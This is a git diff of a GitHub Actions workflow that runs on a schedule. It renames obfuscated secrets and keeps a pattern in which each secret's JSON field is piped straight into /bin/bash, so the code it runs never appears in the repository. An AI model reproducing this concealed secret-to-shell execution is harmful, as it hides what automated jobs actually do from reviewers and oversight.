@@ -3,22 +3,19 @@ name: yangguiziii
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
+    - cron: '19 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yangguiziii
         env:
-          vt81: ${{ secrets.vt81 }}
+          xfwl115: ${{ secrets.xfwl115 }}
         run: |
-          echo $vt81 | jq -r .fxwun391 | /bin/bash
-          echo $nf611 | jq -r .u67 | /bin/bash
-          echo $czq5 | jq -r .h5 | /bin/bash
-          echo $jtqb0036 | jq -r .bjil086 | /bin/bash
-          echo $oytm5543 | jq -r .k7 | /bin/bash
-          echo $lc82 | jq -r .vwgg41 | /bin/bash
-          echo $dkzk6 | jq -r .ja25053 | /bin/bash
-          echo $uy45 | jq -r .p2 | /bin/bash
+          echo $xfwl115 | jq -r .ahoh34343 | /bin/bash
+          echo $pg68483 | jq -r .mwx7 | /bin/bash
+          echo $whpiu7875 | jq -r .uw321 | /bin/bash
 
